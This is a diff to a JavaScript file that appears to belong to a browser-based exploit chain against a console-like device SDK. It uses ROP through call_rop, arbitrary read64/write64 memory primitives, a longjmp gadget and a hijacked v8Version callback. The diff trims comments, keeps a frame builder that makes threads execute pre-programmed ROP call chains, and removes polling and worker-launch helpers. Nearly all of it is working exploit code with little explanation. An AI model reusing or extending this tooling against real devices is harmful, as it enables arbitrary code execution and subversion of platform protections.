@@ -1,24 +1,15 @@
-// ===================================================================
-// ROP — call_rop() comes from the already-initialized CivSwitch core
-// ===================================================================
+// Worker thread frame builder.
 //
-// call_rop() is reusable: several calls can be chained in one payload and
-// still terminate cleanly. Earlier ShadowStack crashes came from a wrong
-// target: sdk_base + 0xcca8 instead of the GetInfo entry at sdk_base + 0x168ca4.
+// call_rop() is provided by the CivSwitch loader core; not redefined here.
 //
-// call_rop() is provided by the initialized CivSwitch core and is not
-// redefined here. Payloads are evaluated after that setup, so the
-// window.v8Version() callback already points at fake_chi/fake_fgn.
-
-// -- Worker thread frame builder ----------------------------------
+// buildFrame() creates a pre-programmed call chain a new thread executes.
+// Each step calls one function with up to 4 args and stores the return value.
 //
-// Builds a pre-programmed call chain that a new thread can execute.
-// Pattern proven by the reference implementation (wk_twosend.js) on the same
-// SDK and validated on hardware.
-// Think of the frame as a coroutine: each step calls one function with four
-// arguments and stores its return value in a shared results array.
-// Layout: context header at +0x000, results at +0x800, function tables at
-// +0x1000, then the call stack after a 0x10000-byte gap (0x140 bytes per call).
+// Memory layout:
+//   +0x000  context header
+//   +0x800  results array (one u64 per step)
+//   +0x1000 function tables (0x100 bytes per step)
+//   +gap    call stack (0x140 bytes per step)
 //
 // Usage:
 //   var f = buildFrame([
@@ -29,7 +20,7 @@
 //   write64(slot, 0n);
 //   call_rop(F_CreateThread, slot, 0n, GADGET_LONGJMP, f.frame);
 //   call_rop(F_Sleep, 60000000n);
-//   var result = readFrameResult(f.frame, 1);  // IPC return value
+//   var result = readFrameResult(f.frame, 1);
 
 const FRAME_STEP = 0x140;
 const FRAME_RESULT = 0x800;
@@ -95,27 +86,4 @@ function buildFrame(calls) {
 // Read the result of step i from a frame (BigInt, or SENTINEL if not done)
 function readFrameResult(frame, i) {
     return read64(frame + BigInt(FRAME_RESULT + i * 8));
-}
-
-// Poll until step i completes (result != SENTINEL) or maxSpins reached
-function waitFrameResult(frame, index, maxSpins) {
-    maxSpins = maxSpins || 500000;
-    var addr = frame + BigInt(FRAME_RESULT + index * 8);
-    var v = read64(addr);
-    var n = 0;
-    while (v === FRAME_SENTINEL && n < maxSpins) {
-        v = read64(addr);
-        n++;
-    }
-    return { value: v, done: v !== FRAME_SENTINEL, spins: n };
-}
-
-// Launch a worker thread running a pre-built frame.
-// Returns: { slot: BigInt, result: BigInt }
-// slot is the ThreadType struct (SDK-managed, do not closeHandle).
-function launchWorker(frame) {
-    var slot = allocPage(0x100);
-    write64(slot, 0n);
-    var r = call_rop(F_CreateThread, slot, 0n, GADGET_LONGJMP, frame);
-    return { slot: slot, result: r };
 }
